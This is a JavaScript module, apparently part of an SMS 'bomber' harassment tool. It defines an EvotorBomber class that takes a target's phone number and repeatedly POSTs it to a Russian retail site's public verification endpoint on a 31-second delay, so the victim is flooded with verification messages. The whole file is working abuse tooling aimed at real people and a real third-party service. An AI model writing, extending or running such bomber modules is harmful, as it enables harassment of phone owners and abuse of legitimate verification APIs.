const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

require('dotenv').config();
class EvotorBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = false;
        this.splitPhone();
    }
    headers = {
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "evotor";
    delay = 31000;
    url = `https://market.evotor.ru/api/v1/account/public/verifications/`+this.phone;  
}
module.exports = EvotorBomber;